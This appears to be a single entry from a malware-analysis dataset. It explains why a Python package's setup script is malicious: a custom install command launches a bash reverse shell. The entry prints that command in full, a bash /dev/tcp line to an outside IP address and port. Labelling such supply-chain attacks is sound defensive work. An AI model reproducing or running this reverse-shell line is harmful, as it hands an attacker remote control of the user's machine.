      "malicious_behavior": "The code defines a custom installation command in a Python package setup script that executes a shell command immediately after installation. Specifically, it runs a bash reverse shell command: \"bash -c 'bash -i >& /dev/tcp/114.116.119.253/7777 <&1'\". This command attempts to open an interactive bash shell and redirect its input and output over a TCP connection to the IP address 114.116.119.253 on port 7777. This behavior is a classic reverse shell technique used by attackers to gain remote control over the victim's machine. Executing such a command automatically during package installation without user consent or notification is a strong indicator of malicious intent. This pattern is a hallmark of supply chain attacks where malicious code is injected into installation scripts to establish unauthorized remote access. Therefore, this code contains malicious behavior."
